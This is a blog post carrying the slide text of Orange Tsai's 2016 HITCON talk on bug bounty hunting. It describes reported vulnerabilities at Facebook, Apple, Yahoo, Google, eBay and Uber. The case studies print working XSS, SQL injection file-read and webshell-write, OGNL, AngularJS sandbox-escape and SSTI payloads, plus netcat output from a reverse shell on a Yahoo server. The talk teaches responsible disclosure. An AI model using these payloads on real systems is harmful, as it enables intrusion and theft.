---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2016-07-hitcon-2016-slides-bug-bounty-hunter/
title: "HITCON 2016 投影片 - Bug Bounty 獎金獵人甘苦談 那些年我回報過的漏洞 | Orange Tsai"
author: "Orange Tsai"
published: 2016-07-22T16:00:00.000Z
description: "This is my talk about being a Bug Bounty Hunter at HITCON Community 2016. It shared some of my views on finding bugs and some case studies, such as Facebook Remote Code Execution… more details Uber R"
---

* * *

This is my talk about being a Bug Bounty Hunter at [HITCON Community 2016](http://hitcon.org/2016/CMT/). It shared some of my views on finding bugs and some case studies, such as

- Facebook Remote Code Execution… [more details](http://blog.orange.tw/2016/04/bug-bounty-how-i-hacked-facebook-and-found-someones-backdoor-script.html)
- Uber Remote Code Execution… [more details](http://blog.orange.tw/2016/04/bug-bounty-uber-ubercom-remote-code_7.html)
- developer.apple.com Remote Code Execution
- abs.apple.com Remote Code Execution
- b.login.yahoo.com Remote Code Execution… [more details](http://blog.orange.tw/2013/11/yahoo-bug-bounty-part-2-loginyahoocom.html)
- eBay SQL Injection
- [www.google.com](http://www.google.com/) XSS
- Apple XSS
- Facebook Onavo XSS
- Uber XSS

Sorry for it’s only in Chinese. Wishing you would like it.

> [https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2016-Bug-Bounty-I-reported-orange-tsai.pdf](https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2016-Bug-Bounty-I-reported-orange-tsai.pdf)

Bug Bounty 獎金獵人甘苦談 - 那些年我回報過的漏洞 - Speaker Deck

[![Avatar for Orange](https://secure.gravatar.com/avatar/5f7ab2ea341a883bf8572190738e864e?s=47)](https://speakerdeck.com/p8361)

[Bug Bounty 獎金獵人甘苦談 - 那些年我回報過的漏洞](https://speakerdeck.com/p8361/bug-bounty-jiang-jin-lie-ren-gan-ku-tan-na-xie-nian-wo-hui-bao-guo-de-lou-dong)

by [Orange](https://speakerdeck.com/p8361)

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg)](https://speakerdeck.com/)

## Slide 1

### Slide 1 text

Bug Bounty 獎金獵人甘苦談
那些年我回報過的漏洞
orange@chroot.org



## Slide 2

### Slide 2 text

#Orange Tsai
#CHROOT #DEVCORE
#電競選手 #CTFer
#Web #汪



## Slide 3

### Slide 3 text

My RCE Checklists
√ Facebook
√ Apple
√ Yahoo
√ Uber
? Google



## Slide 4

### Slide 4 text

什麼是 Bug Bounty Program ?
• 在官方所提供的規則及範圍下, 讓獨立的研究人員可自由尋找系
統漏洞, 並提供對等的獎勵
小禮物
獎金
名譽（Hall of Fame）



## Slide 5

### Slide 5 text

Bug Bounty 好處?
防止漏洞流入地下市場
架構大難顧及網路邊界
企業對外形象宣傳
改善社會不良風氣
How do you turn
this on ?



## Slide 6

### Slide 6 text

Bug Bounty 好處?
防止漏洞流入地下市場
架構大難顧及網路邊界
企業對外形象宣傳
改善社會不良風氣
更多的駭客！
更多的思路！
更多的漏洞！



## Slide 7

### Slide 7 text

Bug Bounty 好處?
防止漏洞流入地下市場
架構大難顧及網路邊界
企業對外形象宣傳
改善社會不良風氣
公司對於安全的重視！
吸引優秀的資安高手！



## Slide 8

### Slide 8 text

Bug Bounty 好處?
防止漏洞流入地下市場
架構大難顧及網路邊界
企業對外形象宣傳
改善社會不良風氣
告訴駭客們有簡單的
方法可以做好事！



## Slide 9

### Slide 9 text

有哪些企業已經有了 Bug Bounty ?
1995 2010 2011 2013 2013 2016
2014 2015



## Slide 10

### Slide 10 text

No content


## Slide 11

### Slide 11 text

The Internet Bug Bounty
為了維護網路世界的和平
獎勵那些找出可影響整個網路世界弱點的英雄們!



## Slide 12

### Slide 12 text

Bug Bounty 成效
$6 Million
• 750+ bugs in 2015
• 300+ hackers in 2015
$4.2 Million
• 526 bugs in 2015
• 210 hackers in 2015
$1.6 Million
• 2500+ bugs since 2013
• 1800+ hackers since 2013



## Slide 13

### Slide 13 text

No content


## Slide 14

### Slide 14 text

參加 Bug Bounty 前的準備
為了甚麼參加
對於尋找漏洞的心理準備
常見弱點的理解
資訊的蒐集方法
獎金？
名譽？
練功？



## Slide 15

### Slide 15 text

參加 Bug Bounty 前的準備
為了甚麼參加
對於尋找漏洞的心理準備
常見弱點的理解
資訊的蒐集方法
雖然今非昔比
告訴自己一定會有洞



## Slide 16

### Slide 16 text

參加 Bug Bounty 前的準備
為了甚麼參加
對於尋找漏洞的心理準備
常見弱點的理解
資訊的蒐集方法



## Slide 17

### Slide 17 text

常見弱點的理解
SQL Injection
Cross-Site Scripting
Cross-site Request Forgery
XML External Entity
Local File Inclusion
CSV Macro Injection
XSLT Injection
SVG/XML XSS
RPO Gadget (NOT ROP)
Subdomain Takeover



## Slide 18

### Slide 18 text

參加 Bug Bounty 前的準備
為了甚麼參加
對於尋找漏洞的心理準備
常見弱點的理解
資訊的蒐集方法



## Slide 19

### Slide 19 text

資訊的蒐集方法
• DNS 與 網路邊界
子域名? 相鄰域名? 內部域名?
Whois? R-Whois?
併購服務
Google 的六個月規則
• Port Scanning
Facebook Jenkins RCE by Dewhurst Security
Pornhub Memcached Unauthenticated Access by @ZephrFish
uberinternal.com ?
twttr.com ?
etonreve.com ?



## Slide 20

### Slide 20 text

資訊的蒐集方法 \- 小案例
• Yahoo! Yapache
修改版本的 Apache Web Server
在當時也是創舉



## Slide 21

### Slide 21 text

資訊的蒐集方法 \- 小案例



## Slide 22

### Slide 22 text

參加 Bug Bounty 注意事項
• 注意規則及允許範圍
• 不符合規定的漏洞
• 撰寫報告的禮節



## Slide 23

### Slide 23 text

注意規則及允許範圍
• 規則所允許範圍
範圍外就無法嘗試嗎?
• 規則所允許限度
Instagram's Million Dollar Bug by Wesley (Awesome :P)



## Slide 24

### Slide 24 text

參加 Bug Bounty 注意事項
• 注意規則及允許範圍
• 不符合規定的漏洞
• 撰寫報告的禮節



## Slide 25

### Slide 25 text

不符合規定的漏洞
• 別踏入榮譽感的誤區
• 常見不符合規定例子:
SELF XSS (需要過多使用者互動)
Information Leakage
Cookie without Secure Flag or HttpOnly
Logout CSRF
Content Injection



## Slide 26

### Slide 26 text

2014 Google VRP 回報狀況



## Slide 27

### Slide 27 text

參加 Bug Bounty 注意事項
• 注意規則及允許範圍
• 不符合規定的漏洞
• 撰寫報告的禮節



## Slide 28

### Slide 28 text

撰寫報告的禮節
• 明確的標題及描述
• 附上驗證代碼及截圖
• 禮貌及尊重最後決定



## Slide 29

### Slide 29 text

尋找漏洞的思路



## Slide 30

### Slide 30 text

尋找漏洞的思路
• 有做功課的 Bonus
• 天下武功唯快不破
• 認命做苦工活QQ
• 平行權限與邏輯問題
• 少見姿勢與神思路



## Slide 31

### Slide 31 text

有做功課的 Bonus
Facebook Onavo Dom-Based XSS
• Mar 16, 2014 Onavo Reflected XSS by Mazin Ahmed
• May 01, 2014 Facebook fixed it
• One day, Facebook revised it... Buggy again!
http://cf.onavo.com/iphone/mc/deactivate.html
?url=javascript:alert(document.domain)
&seed=1394953248



## Slide 32

### Slide 32 text

有做功課的 Bonus
Facebook Onavo Dom-Based XSS
function mc() {
if ((UACheck == "0") \|\|
(navigator.userAgent.match(/iPhone/i)) \|\|
(navigator.userAgent.match(/iPad/i)) \|\|
(navigator.userAgent.match(/iPod/i))) {
document.location.href = MC;
setTimeout(postmc, 3000);
} else {
alert('Not an iPhone/iPad...');
...
var seed = getQueryVariable("seed");
var url = getQueryVariable("url");
var UACheck = getQueryVariable("uacheck");
var MC = getQueryVariable("mc");



## Slide 33

### Slide 33 text

有做功課的 Bonus
Facebook Onavo Dom-Based XSS
http://cf.onavo.com/iphone/mc/deactivate.html
?url=http://example/
&uacheck=0
&mc=javascript:alert(document.domain)



## Slide 34

### Slide 34 text

有做功課的 Bonus
Facebook Onavo Dom-Based XSS
http://cf.onavo.com/iphone/mc/deactivate.html
?url=http://example/
&uacheck=0
&mc=javascript:alert(document.domain)



## Slide 35

### Slide 35 text

有做功課的 Bonus
eBay SQL Injection
• 列舉 eBay.com 時某台主機反查到
eBayc3.com
• 根據 WHOIS 確認為 eBay Inc. 所擁有無誤
• 列舉 eBayc3.com
images.ebayc3.com



## Slide 36

### Slide 36 text

有做功課的 Bonus
eBay SQL Injection



## Slide 37

### Slide 37 text

有做功課的 Bonus
eBay SQL Injection



## Slide 38

### Slide 38 text

有做功課的 Bonus
eBay SQL Injection
• 連貓都會的 SQL Injection
嘗試是否可以 RCE?
• 嘗試讀檔?
CREATE TABLE test (src TEXT);
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE \`test\`;



## Slide 39

### Slide 39 text

有做功課的 Bonus
eBay SQL Injection
• 連貓都會的 SQL Injection
嘗試是否可以 RCE?
• 嘗試讀檔?
CREATE TABLE test (src TEXT);
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE \`test\`;



## Slide 40

### Slide 40 text

尋找漏洞的思路
• 有做功課的 Bonus
• 天下武功唯快不破
• 認命做苦工活QQ
• 平行權限與邏輯問題
• 少見姿勢與神思路



## Slide 41

### Slide 41 text

天下武功唯快不破
• 指紋辨識, 收集整理
Web Application?
Framework?
• 平時做好筆記 1-Day 出來搶首殺
WordPress CVE-2016-4567 flashmediaelement.swf XSS
ImageTragick Remote Code Execution



## Slide 42

### Slide 42 text

天下武功唯快不破
Uber Reflected XSS



## Slide 43

### Slide 43 text

天下武功唯快不破
Uber Reflected XSS



## Slide 44

### Slide 44 text

iOS Developer - "We'll be back soon"
2013
07/18
天下武功唯快不破
developer.apple.com 被駭案例



## Slide 45

### Slide 45 text

iOS Developer - "We'll be back soon"
Apple confirms its developer website was hacked
2013
07/18
2013
07/22
天下武功唯快不破
developer.apple.com 被駭案例



## Slide 46

### Slide 46 text

iOS Developer - "We'll be back soon"
Apple confirms its developer website was hacked
Ibrahim Balic: I hacked Apple's developer website and have over 100K
developers' user details
2013
07/18
2013
07/22
2013
07/22
天下武功唯快不破
developer.apple.com 被駭案例



## Slide 47

### Slide 47 text

iOS Developer - "We'll be back soon"
Apple confirms its developer website was hacked
Ibrahim Balic: I hacked Apple's developer website and have over 100K
developers' user details
Apple Hall of Fame - "We would like to acknowledge 7dscan.com, and SCANV
of knownsec.com for reporting this issue"
2013
07/18
2013
07/22
2013
07/22
2013
07/??
天下武功唯快不破
developer.apple.com 被駭案例



## Slide 48

### Slide 48 text

天下武功唯快不破
developer.apple.com 被駭案例



## Slide 49

### Slide 49 text

天下武功唯快不破
developer.apple.com 被駭案例



## Slide 50

### Slide 50 text

• 被 Yahoo Bug Bounty 事件燒到, 感覺很好玩
• 依然是 Google hacking
site:yahoo.com ext:action
b.login.yahoo.com
看起來 s2-016 work 但看起來有 WAF
三個月的空窗期 !
第一次 OGNL 就上手 !
天下武功唯快不破
Yahoo Login Site RCE



## Slide 51

### Slide 51 text

• 繞過 WAF
如何判斷關鍵字?
redirect:${12\*21} # /login/252
redirect:${#c=1} # /login/
redirect:${#c=1,1} # /login/1
redirect:${#c=1,#d=new chra\[10\]} # /login/
redirect:${#c=1,#d=new chra\[10\],1} # /login/
天下武功唯快不破
Yahoo Login Site RCE



## Slide 52

### Slide 52 text

orange@z:~$ nc –vvl 12345
Connection from 209.73.163.226 port 12345 \[tcp/italk\] accepted
Linux ac4-laptui-006.adx.ac4.yahoo.com 2.6.18-308.8.2.el5.YAHOO.20120614 #1 SMP Thu
Jun 14 13:27:27 PDT 2012 x86\_64 x86\_64 x86\_64 GNU/Linux
orange@z:~$
天下武功唯快不破
Yahoo Login Site RCE



## Slide 53

### Slide 53 text

天下武功唯快不破
Yahoo Login Site RCE
orange@z:~$ nc –vvl 12345
Connection from 209.73.163.226 port 12345 \[tcp/italk\] accepted
Linux ac4-laptui-006.adx.ac4.yahoo.com 2.6.18-308.8.2.el5.YAHOO.20120614 #1 SMP Thu
Jun 14 13:27:27 PDT 2012 x86\_64 x86\_64 x86\_64 GNU/Linux
orange@z:~$



## Slide 54

### Slide 54 text

尋找漏洞的思路
• 有做功課的 Bonus
• 天下武功唯快不破
• 認命做苦工活QQ
• 平行權限與邏輯問題
• 少見姿勢與神思路



## Slide 55

### Slide 55 text

• 用 Google Hacking 黑 Google
site:www.google.com -adwords -finance...
www.google.com/trends/correlate/js/correlate.js
goog$exportSymbol("showEdit", function(src\_url) {
...
var html = (new goog$html$SafeHtml).
initSecurityPrivateDoNotAccessOrElse\_('
Loading...');
...
}
認命做苦工活QQ
www.google.com XSS



## Slide 56

### Slide 56 text

• 如何控制?
id:PaHT-seSlg9 200 OK
id:not\_exists 500 Error
id:PaHT-seSlg9:foobar 200 OK
www.google.com/trends/correlate/search
?e=id:PaHT-seSlg9
&t=weekly
[認命做苦工活QQ\\
www.google.com XSS](https://speakerdeck.com/player/092ece5ab8aa4cbc8e83cc10b6f8320c?#)

## Slide 57

### Slide 57 text

• 看起來有過濾? 但別忘了它在 JavaScript 內
HTML Entities?
16 進位?
8 進位?
www.google.com/trends/correlate/search
?e=id:PaHT-seSlg9:'"><
&t=weekly
[認命做苦工活QQ\\
www.google.com XSS](https://speakerdeck.com/player/092ece5ab8aa4cbc8e83cc10b6f8320c?#)

## Slide 58

### Slide 58 text

...?
www.google.com/trends/correlate/search
?e=id:8N9IFMOltyp:\\x22onload\\x3d\\x22alert(document.domain)//
&t=weekly
[認命做苦工活QQ\\
www.google.com XSS](https://speakerdeck.com/player/092ece5ab8aa4cbc8e83cc10b6f8320c?#)

## Slide 59

### Slide 59 text

認命做苦工活QQ
www.google.com XSS



## Slide 60

### Slide 60 text

• 看起來是個 Dom-Based 的 SELF-XSS 需要使用者互動 ?
收的機率一半一半, 需要找到更合理的情境說服 Google
• 繼續往下挖掘!
跟 Click Jacking 的組合技?
將要點擊的地方製成 IFRMAE 放在滑鼠下隨著滑鼠移動
認命做苦工活QQ
www.google.com XSS



## Slide 61

### Slide 61 text

認命做苦工活QQ
www.google.com XSS
• https://youtu.be/ESj7PyQ-nv0



## Slide 62

### Slide 62 text

認命做苦工活QQ
www.google.com XSS
• https://youtu.be/ESj7PyQ-nv0



## Slide 63

### Slide 63 text

認命做苦工活QQ
Facebook Remote Code Execution
• 反向 facebook.com 的 Whois 結果
thefacebook.com
tfbnw.net
fb.com
• 列舉 vpn.tfbnw.net 網段
vpn.tfbnw.net
files.fb.com
www.facebooksuppliers.com



## Slide 64

### Slide 64 text

認命做苦工活QQ
Facebook Remote Code Execution
• 從過往紀錄感覺打得進
拿到 VM
解 ionCube
剩下就是你們的事了



## Slide 65

### Slide 65 text

• 拿 Shell
OR 1=1 LIMIT 1 INTO OUTFILE '...' LINES TERMINTATED by
0x3c3f... #
• 拿 Root
有新功能要上怎麼辦? 給用戶一個更新按鈕
不想重造輪子有什麼現有的更新方案? Yum install
Yum install 權限不夠怎麼辦? 加 Sudoers
網頁執行要輸入密碼怎麼辦? 加 NOPASSWD
認命做苦工活QQ
Facebook Remote Code Execution



## Slide 66

### Slide 66 text

認命做苦工活QQ
Facebook Remote Code Execution



## Slide 67

### Slide 67 text

認命做苦工活QQ
Facebook Remote Code Execution



## Slide 68

### Slide 68 text

尋找漏洞的思路
• 有做功課的 Bonus
• 天下武功唯快不破
• 認命做苦工活QQ
• 平行權限與邏輯問題
• 少見姿勢與神思路



## Slide 69

### Slide 69 text

• Google Hacking
site:\*.apple.com –www -developer -...
http://lookup-api.apple.com/wikipedia.org/
平行權限與邏輯問題
Apple XSS



## Slide 70

### Slide 70 text

• lookup-api.apple.com/wikipedia.org # ok
• lookup-api.apple.com/orange.tw # failed
• lookup-api.apple.com/en.wikipedia.org # ok
• lookup-api.apple.com/ja.Wikipedia.org # ok
平行權限與邏輯問題
Apple XSS



## Slide 71

### Slide 71 text

• 難道這段扣錯了嗎?
if (preg\_match("/.wikipedia.org$/", $parsed\_url\['host'\]))
// do proxy
else
// goto fail
平行權限與邏輯問題
Apple XSS



## Slide 72

### Slide 72 text

花 NT$720 有個 XSS
好像不賴XD



## Slide 73

### Slide 73 text

平行權限與邏輯問題
Apple XSS



## Slide 74

### Slide 74 text

平行權限與邏輯問題
Apple XSS



## Slide 75

### Slide 75 text

尋找漏洞的思路
• 有做功課的 Bonus
• 天下武功唯快不破
• 認命做苦工活QQ
• 平行權限與邏輯問題
• 少見姿勢與神思路



## Slide 76

### Slide 76 text

少見姿勢與神思路
• 針對架構的了解
• 非主流的漏洞, 越少人知道的東西越有搞頭
• 思路的培養
CTF (Capture the Flag)
其他獎金獵人的 Write Ups
對新技術的追逐
跨界



## Slide 77

### Slide 77 text

少見姿勢與神思路
Apple RCE, 第一次進入 Apple 內網



## Slide 78

### Slide 78 text

• 忘記密碼 -\> 在某個找回密碼流程中出現的頁面
http://abs.apple.com/ssurvey/thankyou.action
• 那時網路意識不高
Jboss, Tomcat, WebObjects 愛用者
掃到一堆 /CVS/
少見姿勢與神思路
Apple RCE, 第一次進入 Apple 內網



## Slide 79

### Slide 79 text

• Struts2 漏洞在 2012 年根本沒啥人知道
• Google Trend of Struts2
?
?
Apple RCE
少見姿勢與神思路
Apple RCE, 第一次進入 Apple 內網



## Slide 80

### Slide 80 text

少見姿勢與神思路
Apple RCE, 第一次進入 Apple 內網



## Slide 81

### Slide 81 text

發現的經典模式
發現的經典模式是：
「你尋找你知道的東西（比如到達印度的新方法）
結果發現了一個你不知道的東西（美洲）」



## Slide 82

### Slide 82 text

• 掃 OO 廠商範圍時發現一個 IP
怎麼判斷 IP 是不是屬於 OO 廠商? 看憑證
• 進去發現是某國外大廠寫的 OO 系統
Struts2 撰寫
Full Updated
No more s2-0xx
少見姿勢與神思路
某大廠商 XSS 0-Day 發現經過



## Slide 83

### Slide 83 text

• 思路:
Struts2 撰寫 action 都需繼承 ActionSupport
因此要判斷一個網站是不是 Struts2 所撰寫只要在尾巴加
個 ?actionErrors=1 即可
/whatever.action?actionErrors=


## Slide 84

### Slide 84 text

少見姿勢與神思路
某大廠商 XSS 0-Day 發現經過
• 思路:
Struts2 撰寫 action 都需繼承 ActionSupport
因此要判斷一個網站是不是 Struts2 所撰寫只要在尾巴加
個 ?actionErrors=1 即可
/whatever.action?actionErrors=


## Slide 85

### Slide 85 text

One more things...
如果被過濾怎麼辦?



## Slide 86

### Slide 86 text

Thanks for AngularJS
{{'a'.constructor.prototype.charAt=\[\].join;
$eval('x=1} } };alert(1)//');}}



## Slide 87

### Slide 87 text

• Template 相關攻擊手法是近幾年比較夯的東西, 但較少人關注
Client Side Template Injection
Server Side Template Injection
• Uber 在自身技術部落格有提到產品技術細節
主要是 NodeJS 與 Flask
少了做指紋辨識的時間
少見姿勢與神思路
Uber SSTI RCE



## Slide 88

### Slide 88 text

• riders.uber.com
修改姓名使用等到寄信通知帳號變更
Cheng Da{{ 1+1 }}
少見姿勢與神思路
Uber SSTI RCE



## Slide 89

### Slide 89 text

• Python Sandbox Bypass
{{ \[\].\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() }}
Hi, \[, ,\
, ,\
, ,\
..., , ...\
..., , ... \]
• Asynchronous Task
Template( "Hi, %s ..." % get\_name\_from\_db() )
少見姿勢與神思路
Uber SSTI RCE



## Slide 90

### Slide 90 text

少見姿勢與神思路
Uber SSTI RCE
• Python Sandbox Bypass
{{ \[\].\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() }}
Hi, \[, ,\
, ,\
, ,\
..., , ...\
..., , ... \]
• Asynchronous Task
Template( "Hi, %s ..." % get\_name\_from\_db() )



## Slide 91

### Slide 91 text

結語
• 一起成為獎金獵人吧 !
• 勿驕矜自滿, 勿忘初衷
• Organizing Your Know-How, Building Your Own Tool



## Slide 92

### Slide 92 text

閱讀資源
Google Bughunter University
Bugcrowd List Of Bug Bounty Programs
Hackerone Hacktivity
Xsses.com
Facebook Bug Bounties by @phwd
Wooyun.org



## Slide 93

### Slide 93 text

Thank you
orange@chroot.org
blog.orange.tw